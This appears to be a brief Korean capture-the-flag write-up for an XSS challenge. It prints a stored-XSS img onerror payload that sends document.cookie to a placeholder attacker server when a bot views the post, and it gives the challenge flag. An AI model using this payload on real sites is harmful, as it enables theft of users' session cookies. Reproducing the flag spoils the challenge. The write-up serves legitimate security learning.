# 라업
- post 추가하는 엔드포인트에서 content 파라미터로 아래와 같은 패이로드를 넣고, 공격 서버에서 리스닝

```
<img src="nonexistent.jpg" onerror="new Image().src = '[공격 서버 주소]/?cookie=' + document.cookie;">
```

- 그 상태에서 봇 동작시키면 cookie값을 얻어 올 수 있음



# 플래그
K0{co0k1e_1s_r4bbit}

# 설명
xss